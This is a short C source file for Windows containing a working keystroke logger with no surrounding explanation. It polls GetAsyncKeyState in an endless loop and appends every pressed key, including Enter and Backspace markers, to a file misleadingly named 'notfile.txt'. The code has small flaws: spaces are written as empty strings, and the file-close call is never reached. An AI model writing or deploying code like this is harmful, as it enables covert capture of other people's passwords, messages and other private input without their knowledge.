#include <windows.h>
#include <stdio.h>

void StartLogging() {
    FILE *logFile = fopen("notfile.txt", "a");
    while(1){
        Sleep(30);
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0X8000) {
                if (key == VK_RETURN) {
                    fputs("\n[ENTER]\n", logFile);
                } else if (key == VK_BACK) {
                    fputs("[BACKSPACE]", logFile);
                } else if (key == VK_SPACE) {
                    fputs("", logFile);
                } else if (key >= 65 && key <= 90) {
                    fputc(key, logFile);
                
                } else {
                    fprintf(logFile, "[KEY: %d]", key);

                }
                fflush(logFile);
                

            }
        }
    }

    fclose(logFile);
}